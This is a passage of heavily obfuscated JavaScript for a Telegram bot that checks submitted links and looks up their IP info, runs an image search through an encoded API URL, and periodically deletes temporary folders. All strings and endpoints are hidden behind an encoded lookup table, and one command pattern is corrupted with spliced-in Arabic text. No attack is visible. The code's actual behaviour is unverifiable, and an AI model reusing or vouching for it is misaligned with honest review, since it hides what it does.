    const _0xabe54d = _0x54baf1, _0x45f218 = {
            'KIhQa': _0xabe54d(0x79e) + 'ط',
            'HDRzP': _0xabe54d(0x1ff) + 's',
            'qcOww': _0xabe54d(0x7a0) + _0xabe54d(0x7bd) + _0xabe54d(0x480)
        }, _0x4b54ad = _0x9cd6f5[_0xabe54d(0x2cb)]['id'], _0x2d9f71 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x45f218[_0xabe54d(0x4ca)],
                            'callback_data': _0x45f218[_0xabe54d(0x21b)]
                        }]]
            }
        };
    bot[_0xabe54d(0x83a) + 'e'](_0x4b54ad, _0x45f218[_0xabe54d(0x8cb)], _0x2d9f71);
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), _0xb64d04 => {
    const _0x4eb777 = _0x54baf1, _0x55172e = {
            'JoUsQ': function (_0x12f108, _0x3d45f8) {
                return _0x12f108 === _0x3d45f8;
            },
            'aKCzC': _0x4eb777(0x1ff) + 's',
            'JrGBS': _0x4eb777(0x7f2) + _0x4eb777(0x4ee) + _0x4eb777(0x4df)
        }, _0x4bab1e = _0xb64d04[_0x4eb777(0x7ed)][_0x4eb777(0x2cb)]['id'];
    _0x55172e[_0x4eb777(0x4c0)](_0xb64d04[_0x4eb777(0x755)], _0x55172e[_0x4eb777(0x8bc)]) && (bot[_0x4eb777(0x83a) + 'e'](_0x4bab1e, _0x55172e[_0x4eb777(0x62f)]), waiting_for_link[_0x4bab1e] = !![]);
}), bot['on'](_0x54baf1(0x7ed), async _0x21b8e0 => {
    const _0x9f94fc = _0x54baf1, _0x61737c = {
            'frpYe': function (_0x5e7bc3, _0x5acba3) {
                return _0x5e7bc3(_0x5acba3);
            },
            'EfQtS': _0x9f94fc(0x6eb) + _0x9f94fc(0x272) + _0x9f94fc(0x57f),
            'MJdjp': _0x9f94fc(0x2f5) + _0x9f94fc(0x384) + _0x9f94fc(0x3e6) + '%',
            'acPdr': function (_0x5aa300, _0x2e3772) {
                return _0x5aa300(_0x2e3772);
            },
            'FalgD': _0x9f94fc(0x2f5) + _0x9f94fc(0x43b) + _0x9f94fc(0x411) + '5%',
            'Ykkoo': function (_0x9d625a, _0x34d506) {
                return _0x9d625a(_0x34d506);
            },
            'beRTh': _0x9f94fc(0x2f5) + _0x9f94fc(0x459) + _0x9f94fc(0x191) + '0%',
            'ddbsv': _0x9f94fc(0x2f5) + _0x9f94fc(0x459) + _0x9f94fc(0x255) + '5%',
            'zxqdM': _0x9f94fc(0x2f5) + _0x9f94fc(0x459) + _0x9f94fc(0x2d2) + _0x9f94fc(0x750),
            'wowwr': function (_0x2b605d, _0x1f4aec) {
                return _0x2b605d(_0x1f4aec);
            },
            'OAdOk': function (_0x2ba528, _0x172920) {
                return _0x2ba528(_0x172920);
            },
            'CuACh': function (_0x3a6c20, _0x472311) {
                return _0x3a6c20 === _0x472311;
            },
            'vPeuR': _0x9f94fc(0x3e5),
            'AoLHQ': _0x9f94fc(0x5f8) + _0x9f94fc(0x7a7) + _0x9f94fc(0x4e8) + _0x9f94fc(0x44d),
            'abfTA': function (_0xbf52ba, _0x140365) {
                return _0xbf52ba === _0x140365;
            },
            'MDNpA': _0x9f94fc(0x68e),
            'xZSsQ': _0x9f94fc(0x262) + _0x9f94fc(0x1bd) + _0x9f94fc(0x32a) + _0x9f94fc(0x8cc) + _0x9f94fc(0x564) + _0x9f94fc(0x3ab) + _0x9f94fc(0x1f2) + _0x9f94fc(0x7ad) + _0x9f94fc(0x183) + _0x9f94fc(0x8fb) + _0x9f94fc(0x844) + _0x9f94fc(0x43c) + _0x9f94fc(0x73d) + _0x9f94fc(0x785) + _0x9f94fc(0x324) + _0x9f94fc(0x827) + _0x9f94fc(0x363) + _0x9f94fc(0x2a4) + _0x9f94fc(0x32c) + _0x9f94fc(0x690) + _0x9f94fc(0x203),
            'PVIze': _0x9f94fc(0x601) + '🔴',
            'qlJgy': _0x9f94fc(0x34e) + _0x9f94fc(0x6a4) + _0x9f94fc(0x631) + _0x9f94fc(0x510) + _0x9f94fc(0x2c3) + _0x9f94fc(0x8a6) + _0x9f94fc(0x2b3) + _0x9f94fc(0x559) + _0x9f94fc(0x2df) + _0x9f94fc(0x7bc) + _0x9f94fc(0x343) + _0x9f94fc(0x3eb) + _0x9f94fc(0x6ea) + _0x9f94fc(0x63e) + _0x9f94fc(0x3b7) + _0x9f94fc(0x8e5) + _0x9f94fc(0x4ce),
            'xEVzj': function (_0x5a06d4, _0x5c3ade) {
                return _0x5a06d4 || _0x5c3ade;
            },
            'cMpOT': _0x9f94fc(0x5cf) + _0x9f94fc(0x370),
            'UsSCV': _0x9f94fc(0x5ed)
        }, _0x42475b = _0x21b8e0[_0x9f94fc(0x2cb)]['id'], _0x37a73a = _0x21b8e0[_0x9f94fc(0x7e0)];
    if (waiting_for_link[_0x42475b]) {
        if (!_0x61737c[_0x9f94fc(0x2b4)](isValidUrl, _0x37a73a)) {
            bot[_0x9f94fc(0x83a) + 'e'](_0x42475b, _0x61737c[_0x9f94fc(0x47d)]);
            return;
        }
        let _0x13609b = await bot[_0x9f94fc(0x83a) + 'e'](_0x42475b, _0x61737c[_0x9f94fc(0x845)]);
        await _0x61737c[_0x9f94fc(0x641)](sleep, 0x1c0b * -0x1 + -0xb21 + 0x36cc), bot[_0x9f94fc(0x6e6) + _0x9f94fc(0x78b)](_0x61737c[_0x9f94fc(0x215)], {
            'chat_id': _0x42475b,
            'message_id': _0x13609b[_0x9f94fc(0x19c)]
        }), await _0x61737c[_0x9f94fc(0x5e4)](sleep, -0x1 * -0xe99 + 0x1ce9 + -0x1be2), bot[_0x9f94fc(0x6e6) + _0x9f94fc(0x78b)](_0x61737c[_0x9f94fc(0x448)], {
            'chat_id': _0x42475b,
            'message_id': _0x13609b[_0x9f94fc(0x19c)]
        }), await _0x61737c[_0x9f94fc(0x641)](sleep, -0x1f * 0x11 + -0xedc + 0x208b), bot[_0x9f94fc(0x6e6) + _0x9f94fc(0x78b)](_0x61737c[_0x9f94fc(0x397)], {
            'chat_id': _0x42475b,
            'message_id': _0x13609b[_0x9f94fc(0x19c)]
        }), await _0x61737c[_0x9f94fc(0x5e4)](sleep, 0x442 * -0x1 + 0x1d45 + -0x963), bot[_0x9f94fc(0x6e6) + _0x9f94fc(0x78b)](_0x61737c[_0x9f94fc(0x640)], {
            'chat_id': _0x42475b,
            'message_id': _0x13609b[_0x9f94fc(0x19c)]
        }), await _0x61737c[_0x9f94fc(0x5e4)](sleep, -0x2690 + -0x2155 + 0x5 * 0xf29), bot[_0x9f94fc(0x34c) + _0x9f94fc(0x87d)](_0x42475b, _0x13609b[_0x9f94fc(0x19c)]);
        const _0x2a342a = _0x61737c[_0x9f94fc(0x565)](checkUrl, _0x37a73a), _0x56b015 = await _0x61737c[_0x9f94fc(0x641)](extractIpFromUrl, _0x37a73a), _0x18e571 = _0x56b015 ? await _0x61737c[_0x9f94fc(0x916)](getIpInfo, _0x56b015) : {};
        let _0x216f71 = '';
        if (_0x61737c[_0x9f94fc(0x3b2)](_0x2a342a, _0x61737c[_0x9f94fc(0x327)]))
            _0x216f71 = _0x61737c[_0x9f94fc(0x918)];
        else {
            if (_0x61737c[_0x9f94fc(0x646)](_0x2a342a, _0x61737c[_0x9f94fc(0x88c)]))
                _0x216f71 = _0x61737c[_0x9f94fc(0x753)];
            else
                _0x61737c[_0x9f94fc(0x646)](_0x2a342a, _0x61737c[_0x9f94fc(0x3cc)]) && (_0x216f71 = _0x61737c[_0x9f94fc(0x2af)]);
        }
        const _0x4d63e7 = _0x9f94fc(0x38f) + _0x9f94fc(0x1a5) + _0x37a73a + (_0x9f94fc(0x75a) + _0x9f94fc(0x287) + ':\x20') + _0x2a342a + (_0x9f94fc(0x75a) + _0x9f94fc(0x688) + _0x9f94fc(0x6a1)) + _0x216f71 + (_0x9f94fc(0x75a) + _0x9f94fc(0x299) + _0x9f94fc(0x727)) + _0x61737c[_0x9f94fc(0x4bd)](_0x56b015, _0x61737c[_0x9f94fc(0x875)]) + (_0x9f94fc(0x75a) + _0x9f94fc(0x6d7) + _0x9f94fc(0x47a)) + (_0x18e571[_0x9f94fc(0x4b2)] || _0x61737c[_0x9f94fc(0x3ba)]) + _0x9f94fc(0x884);
        bot[_0x9f94fc(0x83a) + 'e'](_0x42475b, _0x4d63e7), waiting_for_link[_0x42475b] = ![];
    } else
        bot[_0x9f94fc(0x83a) + 'e'](_0x42475b, '');
});
const currentSearch = {};
bot[_0x54baf1(0x67d)](/\/stاههلىنححظةرلrt/, _0xb37a8 => {
    const _0x169e8d = _0x54baf1, _0x4b5c65 = {
            'ePwEe': _0x169e8d(0x23b),
            'OXnrE': _0x169e8d(0x80e) + _0x169e8d(0x808),
            'hgWoM': _0x169e8d(0x7b7) + _0x169e8d(0x467) + _0x169e8d(0x503) + _0x169e8d(0x2bb) + _0x169e8d(0x668) + _0x169e8d(0x368) + '-'
        }, _0x5d9d0a = _0xb37a8[_0x169e8d(0x2cb)]['id'], _0x2357b6 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x4b5c65[_0x169e8d(0x527)],
                            'callback_data': _0x4b5c65[_0x169e8d(0x652)]
                        }]]
            }
        };
    bot[_0x169e8d(0x83a) + 'e'](_0x5d9d0a, _0x4b5c65[_0x169e8d(0x430)], _0x2357b6);
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), async _0x39ffe6 => {
    const _0x1e362a = _0x54baf1, _0x24d1f1 = {
            'YSUYo': function (_0xe45a8c, _0x5f1854) {
                return _0xe45a8c === _0x5f1854;
            },
            'zwXXF': _0x1e362a(0x80e) + _0x1e362a(0x808),
            'MuPsq': function (_0x5168a2, _0x4b4a8a) {
                return _0x5168a2 === _0x4b4a8a;
            },
            'SnFSF': _0x1e362a(0x1c6) + _0x1e362a(0x796),
            'lBbyM': _0x1e362a(0x505) + _0x1e362a(0x586) + _0x1e362a(0x4b4) + _0x1e362a(0x6d9) + _0x1e362a(0x662),
            'nyZfT': _0x1e362a(0x28f) + _0x1e362a(0x848) + _0x1e362a(0x7b2) + _0x1e362a(0x43f) + _0x1e362a(0x38c) + _0x1e362a(0x6f2) + _0x1e362a(0x64f) + _0x1e362a(0x7c7) + _0x1e362a(0x5ee) + _0x1e362a(0x341) + _0x1e362a(0x566) + _0x1e362a(0x205) + _0x1e362a(0x25f) + _0x1e362a(0x41f) + _0x1e362a(0x924) + _0x1e362a(0x4a7) + _0x1e362a(0x433) + '\x20'
        }, _0x543978 = _0x39ffe6[_0x1e362a(0x7ed)][_0x1e362a(0x2cb)]['id'];
    _0x24d1f1[_0x1e362a(0x1f4)](_0x39ffe6[_0x1e362a(0x755)], _0x24d1f1[_0x1e362a(0x4b6)]) && (_0x24d1f1[_0x1e362a(0x21e)](currentSearch[_0x543978], _0x24d1f1[_0x1e362a(0x4b0)]) ? bot[_0x1e362a(0x83a) + 'e'](_0x543978, _0x24d1f1[_0x1e362a(0x823)]) : (bot[_0x1e362a(0x83a) + 'e'](_0x543978, _0x24d1f1[_0x1e362a(0x3c6)]), currentSearch[_0x543978] = _0x24d1f1[_0x1e362a(0x4b0)]));
}), bot['on'](_0x54baf1(0x7ed), async _0x4ed87f => {
    const _0x49a5f3 = _0x54baf1, _0x78112 = {
            'HLQKW': function (_0x938eed, _0x30e8c3) {
                return _0x938eed === _0x30e8c3;
            },
            'qYSfm': _0x49a5f3(0x1c6) + _0x49a5f3(0x796),
            'YnMiP': function (_0x29f261, _0x38b19c) {
                return _0x29f261(_0x38b19c);
            },
            'apVgq': function (_0x4b79ad, _0x1a8583) {
                return _0x4b79ad(_0x1a8583);
            },
            'BWnEj': function (_0x53e072, _0xac4cb0) {
                return _0x53e072 === _0xac4cb0;
            },
            'sHeSX': _0x49a5f3(0x418) + _0x49a5f3(0x76e) + _0x49a5f3(0x6ff),
            'zytWU': function (_0x552953, _0x176cc5) {
                return _0x552953 < _0x176cc5;
            },
            'iJHvK': function (_0x7ea501, _0x3630e1) {
                return _0x7ea501 + _0x3630e1;
            },
            'tkOJr': _0x49a5f3(0x5e7) + _0x49a5f3(0x2ac) + _0x49a5f3(0x2c7) + _0x49a5f3(0x4f3),
            'NQXao': function (_0x1d1f0f, _0x139576) {
                return _0x1d1f0f !== _0x139576;
            }
        }, _0xcad11c = _0x4ed87f[_0x49a5f3(0x2cb)]['id'];
    if (_0x78112[_0x49a5f3(0x6fd)](currentSearch[_0xcad11c], _0x78112[_0x49a5f3(0x52b)])) {
        const _0x2b47c8 = _0x4ed87f[_0x49a5f3(0x7e0)], _0x1fb218 = _0x49a5f3(0x33a) + _0x49a5f3(0x5ef) + _0x49a5f3(0x2a5) + _0x49a5f3(0x3da) + _0x49a5f3(0x382) + _0x49a5f3(0x69e) + _0x49a5f3(0x775) + _0x49a5f3(0x773) + _0x49a5f3(0x3c2) + _0x78112[_0x49a5f3(0x664)](encodeURIComponent, _0x2b47c8) + (_0x49a5f3(0x7c0) + _0x49a5f3(0x5d6) + _0x49a5f3(0x1e5)) + _0x78112[_0x49a5f3(0x5c7)](encodeURIComponent, _0x2b47c8) + (_0x49a5f3(0x7a4) + _0x49a5f3(0x315) + _0x49a5f3(0x74a) + _0x49a5f3(0x83d) + _0x49a5f3(0x633));
        try {
            const _0x1ee223 = await axios[_0x49a5f3(0x2e2)](_0x1fb218), _0xaa89d4 = _0x1ee223[_0x49a5f3(0x755)][_0x49a5f3(0x91b) + _0x49a5f3(0x830)]?.[_0x49a5f3(0x755)]?.[_0x49a5f3(0x23d)] || [];
            if (_0x78112[_0x49a5f3(0x55f)](_0xaa89d4[_0x49a5f3(0x5dc)], -0x1aa1 + 0x47 * 0x17 + -0xa20 * -0x2)) {
                bot[_0x49a5f3(0x83a) + 'e'](_0xcad11c, _0x78112[_0x49a5f3(0x495)]), delete currentSearch[_0xcad11c];
                return;
            }
            for (let _0x8987e7 = 0x1591 * 0x1 + 0x307 + -0x626 * 0x4; _0x78112[_0x49a5f3(0x3f1)](_0x8987e7, _0xaa89d4[_0x49a5f3(0x5dc)]); _0x8987e7++) {
                const _0x12a98a = _0xaa89d4[_0x8987e7], _0x362a73 = _0x12a98a[_0x49a5f3(0x831)]?.[_0x49a5f3(0x729)]?.[_0x49a5f3(0x798)];
                _0x362a73 ? bot[_0x49a5f3(0x7ca)](_0xcad11c, _0x362a73, { 'caption': _0x49a5f3(0x72a) + _0x78112[_0x49a5f3(0x3de)](_0x8987e7, -0xbe3 + 0x931 * -0x3 + -0x1 * -0x2777) }) : bot[_0x49a5f3(0x83a) + 'e'](_0xcad11c, _0x78112[_0x49a5f3(0x54e)]);
            }
            delete currentSearch[_0xcad11c];
        } catch (_0xb6e51b) {
            bot[_0x49a5f3(0x83a) + 'e'](_0xcad11c, _0x49a5f3(0x5c2) + _0xb6e51b[_0x49a5f3(0x7ed)]), delete currentSearch[_0xcad11c];
        }
    } else {
        if (!currentSearch[_0xcad11c])
            bot[_0x49a5f3(0x83a) + 'e'](_0xcad11c, '');
        else
            _0x78112[_0x49a5f3(0x64b)](currentSearch[_0xcad11c], _0x78112[_0x49a5f3(0x52b)]) && bot[_0x49a5f3(0x83a) + 'e'](_0xcad11c, '');
    }
});
const clearTemporaryStorage = () => {
    const _0x169261 = _0x54baf1, _0x29456b = {
            'TbiLx': function (_0x30f6cb, _0x8ac17a) {
                return _0x30f6cb(_0x8ac17a);
            },
            'khoWl': _0x169261(0x923) + _0x169261(0x336) + _0x169261(0x2d0),
            'JvoQx': _0x169261(0x5dd),
            'wpmoC': _0x169261(0x4c7),
            'jhJkl': _0x169261(0x831),
            'WhEJr': _0x169261(0x188) + _0x169261(0x579) + _0x169261(0x6c4) + _0x169261(0x6d8)
        };
    try {
        console[_0x169261(0x3f8)](_0x29456b[_0x169261(0x5a1)]);
        const _0x47e0ea = [
            _0x29456b[_0x169261(0x61b)],
            _0x29456b[_0x169261(0x696)],
            _0x29456b[_0x169261(0x8e4)]
        ];
        _0x47e0ea[_0x169261(0x6df)](_0x547606 => {
            const _0x236e0e = _0x169261, _0x33a3ec = path[_0x236e0e(0x45e)](__dirname, _0x547606);
            fs[_0x236e0e(0x407)](_0x33a3ec) ? (_0x29456b[_0x236e0e(0x522)](deleteFolderRecursive, _0x33a3ec), console[_0x236e0e(0x3f8)](_0x236e0e(0x6e0) + _0x236e0e(0x5f1) + _0x33a3ec)) : console[_0x236e0e(0x3f8)](_0x236e0e(0x73a) + _0x236e0e(0x2c4) + _0x33a3ec);
        });
    } catch (_0x34bf8f) {
        console[_0x169261(0x44a)](_0x29456b[_0x169261(0x204)], _0x34bf8f);
    }
};
setInterval(() => {
    const _0x40606a = _0x54baf1, _0x264314 = {
            'QZKQo': function (_0x15654a) {
                return _0x15654a();
            },
            'jlaHv': _0x40606a(0x4ed) + _0x40606a(0x901) + _0x40606a(0x5e9)
        };
    _0x264314[_0x40606a(0x30b)](clearTemporaryStorage), console[_0x40606a(0x3f8)](_0x264314[_0x40606a(0x59c)]);
}, (-0x264b * 0x1 + 0x1398 + 0x12b5) * (-0x1db6 + 0x4f8 + 0x2 * 0xc7d) * (-0x17bd * 0x1 + 0x1c93 + -0xee));
const handleExit = () => {
    const _0x4bf110 = _0x54baf1, _0x932caa = {
            'aqgcU': _0x4bf110(0x3b8) + _0x4bf110(0x805) + _0x4bf110(0x73c) + _0x4bf110(0x472),
            'HkFPd': function (_0x381e0f) {
                return _0x381e0f();
            }
        };
    console[_0x4bf110(0x3f8)](_0x932caa[_0x4bf110(0x61c)]), _0x932caa[_0x4bf110(0x31b)](clearTemporaryStorage), process[_0x4bf110(0x642)]();
};
process['on'](_0x54baf1(0x642), handleExit), process['on'](_0x54baf1(0x323), handleExit), process['on'](_0x54baf1(0x84b), handleExit), process['on'](_0x54baf1(0x5b2), handleExit);